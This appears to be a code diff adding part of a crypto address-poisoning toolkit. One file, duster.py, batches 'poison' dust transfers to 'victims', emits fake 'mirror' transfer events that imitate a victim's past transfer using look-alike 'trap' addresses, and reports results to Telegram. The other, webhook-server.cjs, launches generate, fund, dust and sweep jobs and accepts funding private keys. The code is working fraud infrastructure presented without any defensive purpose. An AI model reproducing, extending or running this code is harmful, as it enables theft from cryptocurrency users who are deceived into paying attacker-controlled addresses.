+            tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
+            
+            if tx_hash:
+                success += len(poison_queue)
+                logger.info(f"[batch] ✅ Multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+                
+                for tid in batch_trap_ids:
+                    update_trap_dust_count(tid)
+                    
+                send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
+                
+                # 🚀 NONCE SAFETY: Wait 2 seconds to let the RPC load-balancer sync the mined block 
+                # before the next batch fetches the 'pending' nonce. Prevents "nonce too low" errors.
+                time.sleep(2) 
+            else:
+                operator_key = get_mirror_operator_key(campaign_id)
+                if operator_key:
+                    try:
+                        operator_addr = w3.eth.account.from_key(operator_key).address
+                        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+                        if operator_balance < w3.to_wei(0.0001, 'ether'):
+                            gas_failures += 1
+                            logger.warning(f"[batch] ❌ Multi-token batch failed (gas insufficient)")
+                            if gas_failures >= 3:
+                                logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
+                                poison_queue.clear()
+                                break
+                        else:
+                            logger.error(f"[batch] ❌ Multi-token batch failed (other reason)")
+                    except Exception:
+                        logger.error(f"[batch] ❌ Multi-token batch failed")
+                else:
+                    logger.error(f"[batch] ❌ Multi-token batch failed (no operator key)")
+            
+            poison_queue.clear()
+        
+        if job_id and i % 5 == 0:
+            update_job(job_id, progress=i)
+        time.sleep(0.5)  # Reduced delay since we're batching
+    
+        # 🚀 Process remaining items in queue (final multi-token batch)
+    if poison_queue:
+        logger.info(f"[batch] Processing final multi-token batch of {len(poison_queue)} victims...")
+        
+        batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
+        
+        tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
+        
+        if tx_hash:
+            success += len(poison_queue)
+            logger.info(f"[batch] ✅ Final multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+            
+            for tid in batch_trap_ids:
+                update_trap_dust_count(tid)
+                
+            send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=True)
+        else:
+            logger.error(f"[batch] ❌ Final multi-token batch failed")
+
+        # Summary with gas failure information
+    failed = total - success - skipped_dusted
+    logger.info(f"Completed: {success}/{total} successful. Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})")
+    
+    if gas_failures > 0:
+        summary_msg = (
+            f"⚠️ Mirror batch incomplete\n"
+            f"✅ Successful: {success}/{total}\n"
+            f"⏭️ Skipped (already dusted): {skipped_dusted}\n"
+            f"❌ Failed: {failed}\n"
+            f"⛽ Gas failures: {gas_failures}\n\n"
+            f"💡 Your funding wallet needs more ETH to continue."
+        )
+    else:
+        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful.\n⏭️ Skipped (already dusted): {skipped_dusted}"
+    
+    send_telegram(summary_msg, campaign_id=campaign_id)
+
+    if job_id:
+        if success == total:
+            update_job(job_id, status='completed', progress=total, message='All done')
+        else:
+            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
+
+if __name__ == "__main__":
+    setup_graceful_shutdown()
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--job-id', help='Job ID for tracking')
+    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
+    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
+    args = parser.parse_args()
+    
+    job_id = args.job_id
+    campaign_id = None
+    trap_ids = None
+    
+    # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
+    trap_ids_env = os.getenv('TRAP_IDS', '').strip()
+    if trap_ids_env:
+        trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
+        logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
+    
+    if job_id:
+        update_job(job_id, status='running')
+        campaign_id = get_campaign_id_from_job(job_id)
+    else:
+        campaign_id = os.getenv('CAMPAIGN_ID')
+
+    if args.private_key and args.victim_address:
+        trap_address = w3.eth.account.from_key(args.private_key).address.lower()
+
+        # STEP 1: Fetch last transfer from blockchain
+        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
+        if not counterparty:
+            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='No counterparty found')
+            sys.exit(1)
+
+        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
+
+        if not fetched_asset or not fetched_amount:
+            # 🆕 Use default fallback: emit a small native transfer
+            logger.info(f"[mirror] No transfer found, using default {NATIVE_SYMBOL} fallback (1 {NATIVE_SYMBOL})")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
+
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+
+        # STEP 2: Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
+
+        if tx_hash:
+            decimals = get_token_decimals(fetched_asset)
+            amount_display = fetched_amount / (10 ** decimals)
+            
+            victim_url = get_explorer_url(args.victim_address)
+            trap_url = get_explorer_url(trap_address)
+            tx_url = get_explorer_url(tx_hash, 'tx')
+            
+            success_msg = (
+                f"🪞 *Mirror event emitted!*\n\n"
+                f"💰 Amount: {amount_display:.6f} {fetched_asset}\n"
+                f"👤 [Victim]({victim_url})\n"
+                f"🪤 [Trap]({trap_url})\n\n"
+                f"🔗 [View TX on Explorer]({tx_url})"
+            )
+            logger.info(success_msg)
+            send_telegram(success_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
+        else:
+            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='Mirror emission failed')
+            sys.exit(1)
+    else:
+        batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)
+===== END FILE: tools/duster.py =====
+
+
+===== FILE: webhook-server.cjs =====
+#!/usr/bin/env node
+
+/**
+ * webhook-server.js
+ * Receives job triggers from Vercel via HTTP POST, spawns the corresponding
+ * Python/Node script, and runs it detached.
+ *
+ * Usage:
+ *    node webhook-server.js
+ *    or with PM2: pm2 start webhook-server.js --name webhook
+ */
+
+const express = require('express');
+const { spawn } = require('child_process');
+const path = require('path');
+const fs = require('fs');
+require('dotenv').config();
+
+// ─── Supabase client for fetching Clore config ───
+const { createClient } = require('@supabase/supabase-js');
+
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
+let supabase = null;
+
+if (supabaseUrl && supabaseKey) {
+  supabase = createClient(supabaseUrl, supabaseKey);
+  console.log('[webhook] Supabase client initialized for config fetching');
+} else {
+  console.warn('[webhook] Supabase credentials missing – Clore config will fall back to env vars');
+}
+
+// ─── Helper to fetch Clore config from Supabase ───
+async function getCloreConfig() {
+  if (!supabase) {
+    console.warn('[webhook] Supabase client not available, using env vars for Clore config');
+    return {};
+  }
+  try {
+    const { data, error } = await supabase
+      .from('app_config')
+      .select('key, value')
+      .in('key', ['CLORE_INSTANCE_ID', 'BATCH_REMOTE_HOST', 'BATCH_REMOTE_PORT']);
+
+    if (error) {
+      console.error('[webhook] Failed to fetch Clore config from Supabase:', error);
+      return {};
+    }
+
+    const config = {};
+    data.forEach(row => {
+      config[row.key] = row.value;
+    });
+    console.log('[webhook] Clore config fetched from Supabase:', config);
+    return config;
+  } catch (err) {
+    console.error('[webhook] Exception fetching Clore config:', err);
+    return {};
+  }
+}
+
+// ─── Startup Safety Checks ───
+const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
+if (!WEBHOOK_SECRET || WEBHOOK_SECRET === 'change-me') {
+  console.error('\x1b[31m[FATAL] WEBHOOK_SECRET is not set or is still set to the default "change-me".\x1b[0m');
+  console.error('\x1b[31m[FATAL] Please set a secure WEBHOOK_SECRET in your .env file before running in production.\x1b[0m');
+  process.exit(1);
+}
+
+const app = express();
+const PORT = process.env.WEBHOOK_PORT || 3001;
+const LOG_LIMIT_MB = 10; // Auto-rotate logs when they exceed 10MB
+
+// ─── Middleware ───
+app.use(express.json({ limit: '1mb' }));
+
+// Helper to safely handle native log rotation on Unix/macOS
+function rotateLogsIfNeeded(logFile) {
+  try {
+    if (fs.existsSync(logFile)) {
+      const stats = fs.statSync(logFile);
+      const maxSizeBytes = LOG_LIMIT_MB * 1024 * 1024;
+
+      if (stats.size > maxSizeBytes) {
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const archiveFile = logFile.replace('.log', `-${timestamp}.log`);
+
+        // Rename the old log. Active child processes will keep writing to the old file
+        // descriptor safely, while new processes will write to the fresh log file.
+        fs.renameSync(logFile, archiveFile);
+        console.log(`[webhook] Rotated log file. Old log saved as: ${archiveFile}`);
+      }
+    }
+  } catch (err) {
+    console.error('[webhook] Log rotation failed:', err);
+  }
+}
+
+// ─── Health check ───
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+// ─── Webhook handler (now async) ───
+app.post('/webhook/job', async (req, res) => {
+  const { jobId, campaignId, chain, type, fundingPrivateKey } = req.body;
+
+  // 1. Dual-Validation for Authentication
+  const customHeader = req.headers['x-webhook-secret'];
+  const authHeader = req.headers['authorization'];
+  let token = customHeader;
+
+  if (authHeader && authHeader.startsWith('Bearer ')) {
+    token = authHeader.substring(7);
+  }
+
+  if (!token || token !== WEBHOOK_SECRET) {
+    console.error('[webhook] Unauthorized request: Invalid or missing token/secret');
+    return res.status(401).json({ error: 'Invalid authentication secret' });
+  }
+
+  // 2. Validate required fields
+  if (!jobId || !campaignId || !chain || !type) {
+    console.error('[webhook] Missing required fields', { jobId, campaignId, chain, type });
+    return res.status(400).json({ error: 'Missing required fields' });
+  }
+
+  console.log(`[webhook] Received ${type} job ${jobId} for campaign ${campaignId} on ${chain}`);
+
+  // 3. Determine script path and arguments
+  let scriptPath, args, interpreter = 'python3';
+  const env = {
+    ...process.env,
+    CHAIN: chain,
+    JOB_ID: jobId,
+    CAMPAIGN_ID: campaignId,
+  };
+
+  const projectRoot = __dirname;
+
+  switch (type) {
+    case 'generate':
+      scriptPath = path.join(projectRoot, 'src', 'batch_generate.py');
+      args = ['--job-id', jobId];
+
+      // ─── Add max-keys if provided ───
+      if (req.body.maxKeys) {
+        args.push('--max-keys', String(req.body.maxKeys));
+      }
+
+      // ─── Fetch Clore config from Supabase and inject into env ───
+      try {
+        const cloreConfig = await getCloreConfig();
+        env.CLORE_INSTANCE_ID = cloreConfig.CLORE_INSTANCE_ID || process.env.CLORE_INSTANCE_ID;
+        env.BATCH_REMOTE_HOST = cloreConfig.BATCH_REMOTE_HOST || process.env.BATCH_REMOTE_HOST;
+        env.BATCH_REMOTE_PORT = cloreConfig.BATCH_REMOTE_PORT || process.env.BATCH_REMOTE_PORT;
+        console.log(`[webhook] Clore config applied: INSTANCE=${env.CLORE_INSTANCE_ID}, HOST=${env.BATCH_REMOTE_HOST}, PORT=${env.BATCH_REMOTE_PORT}`);
+      } catch (err) {
+        console.error('[webhook] Error applying Clore config:', err);
+      }
+      break;
+
+    case 'fund':
+      scriptPath = path.join(projectRoot, 'batch_fund.py');
+      args = ['--job-id', jobId];
+      if (!fundingPrivateKey) {
+        console.error('[webhook] fundingPrivateKey missing for fund job');
+        return res.status(400).json({ error: 'fundingPrivateKey required for fund job' });
+      }
+      env.SOURCE_PRIVATE_KEY = fundingPrivateKey;
+      break;
+
+    case 'dust':
+      scriptPath = path.join(projectRoot, 'tools', 'duster.py');
+      args = ['--job-id', jobId];
+      // 🆕 Pass filtered trap IDs if provided, with safety limit
+      if (req.body.trapIds) {
+        let trapIdsArray = req.body.trapIds.split(',');
+        const totalTraps = trapIdsArray.length;
+
+        // Apply quantity limit if provided
+        if (req.body.quantity && req.body.quantity > 0 && trapIdsArray.length > req.body.quantity) {
+          trapIdsArray = trapIdsArray.slice(0, req.body.quantity);
+          console.log(`[webhook] Dust job limited to ${req.body.quantity} traps (from ${totalTraps})`);
+        }
+
+        // Safety limit to prevent E2BIG error (max 2000 IDs)
+        const MAX_TRAP_IDS = 2000;
+        if (trapIdsArray.length > MAX_TRAP_IDS) {
+          console.warn(`[webhook] Too many trap IDs (${trapIdsArray.length}), limiting to ${MAX_TRAP_IDS} to prevent E2BIG`);
+          trapIdsArray = trapIdsArray.slice(0, MAX_TRAP_IDS);
+        }
+
+        env.TRAP_IDS = trapIdsArray.join(',');
+        console.log(`[webhook] Dust job — processing ${trapIdsArray.length} traps`);
+      }
+      break;
+
+    case 'sweep':
+      scriptPath = path.join(projectRoot, 'src', 'sweeper.js');
+      args = ['--job-id', jobId, '--campaign-id', campaignId];
+      interpreter = 'node';
+      env.CAMPAIGN_ID = campaignId;
+      break;
+
+    default:
+      console.error('[webhook] Unknown job type:', type);
+      return res.status(400).json({ error: 'Unknown job type' });
+  }
+
+  // 4. Check if script exists
+  if (!fs.existsSync(scriptPath)) {
+    console.error('[webhook] Script not found:', scriptPath);
+    return res.status(500).json({ error: `Script not found: ${scriptPath}` });
+  }
+
+  // 5. Setup Logging Directory, Log Rotation, and Files
+  const logDir = path.join(projectRoot, 'logs');
+  if (!fs.existsSync(logDir)) {
+    fs.mkdirSync(logDir, { recursive: true });
+  }
+  const logFile = path.join(logDir, 'jobs.log');
+
+  // Rotate log if it exceeds our size limit (10MB) before we write to it
+  rotateLogsIfNeeded(logFile);
+
+  const outStream = fs.openSync(logFile, 'a');
+
+  console.log(`[webhook] Spawning: ${interpreter} ${scriptPath} ${args.join(' ')}`);
+
+  // 6. Spawn the process detached
+  const child = spawn(interpreter, [scriptPath, ...args], {
+    env,
+    detached: true,
+    stdio: ['ignore', outStream, outStream], // Standard streams piped to outStream
+    cwd: projectRoot,
+  });
+
+  // CRITICAL FIX: Close the parent process's file descriptor handle.
+  // The OS passes a duplicated descriptor to the child, so closing it in the 
+  // parent does NOT stop the child from logging, but it DOES prevent a system FD leak!
+  fs.closeSync(outStream);
+
+  // Disconnect the parent's IPC channel so the parent can respond immediately
+  child.unref();
+
+  // 7. Log process start
+  console.log(`[webhook] ${type} job ${jobId} started (PID: ${child.pid}). Logs routed to logs/jobs.log`);
+
+  // 8. Respond immediately
+  res.status(202).json({ message: `Job ${jobId} accepted for execution` });
+});
+
+// ─── Start server ───
+app.listen(PORT, () => {
+  console.log(`[webhook] Server running on port ${PORT}`);
+  console.log(`[webhook] Webhook endpoint: http://localhost:${PORT}/webhook/job`);
+  console.log(`[webhook] Health: http://localhost:${PORT}/health`);
+});
+===== END FILE: webhook-server.cjs =====
